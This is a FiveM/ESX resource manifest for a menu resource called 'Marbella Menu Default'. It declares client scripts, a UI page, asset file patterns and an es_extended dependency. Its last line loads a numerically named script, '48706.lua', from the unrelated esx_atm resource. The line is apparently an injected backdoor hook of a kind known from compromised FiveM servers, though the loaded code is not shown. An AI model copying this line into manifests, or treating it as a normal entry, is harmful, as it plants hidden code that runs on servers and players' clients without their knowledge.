resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'Marbella Menu Default by KlixxCorp'

version '1.0.4'


client_scripts {
	'@es_extended/client/wrapper.lua',
	'client/*.lua'
}

ui_page {
	'html/ui.html'
}

files {
	'**/*.html',
	'**/**/*.css',
	'**/**/*.js',
	'**/**/app.js',
	'**/**/*.ttf',
	'**/**/*.otf',
	'**/**/*.png'
}

dependencies {
	'es_extended'
}

client_script '@esx_atm/48706.lua'